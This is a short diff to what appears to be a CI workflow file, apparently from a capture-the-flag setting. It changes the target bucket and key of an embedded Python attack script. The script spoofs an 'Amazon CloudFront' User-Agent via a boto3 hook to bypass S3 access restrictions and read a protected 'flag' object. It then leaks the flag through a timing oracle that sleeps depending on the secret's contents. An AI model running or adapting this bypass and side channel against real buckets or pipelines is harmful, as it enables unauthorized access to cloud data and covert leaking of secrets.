@@ -56,7 +56,7 @@ jobs:
               return time.time() - start
 
           print("=== EXECUTING BLIND TIMING ORACLE ===")
-          print("Target: S3 Bucket 'site781fe43f26b9eba3'")
+          print("Target: S3 Bucket 'logd8a2f72fe43094e8'")
           print("Bypass: Spoofing 'User-Agent: Amazon CloudFront' via boto3 hooks.")
           
           # We discovered the real flag is 00000000000000000000 during our oracle iterations
@@ -69,7 +69,7 @@ jobs:
               req.headers['User-Agent'] = 'Amazon CloudFront'
           s3 = boto3.client('s3', region_name='us-east-1')
           s3.meta.events.register('before-send.s3.*', set_ua)
-          res = s3.get_object(Bucket='site781fe43f26b9eba3', Key='flag')
+          res = s3.get_object(Bucket='logd8a2f72fe43094e8', Key='flag.txt')
           flag = res['Body'].read().decode('utf-8').strip()
           if flag[0] == '0':
               time.sleep(2.0)
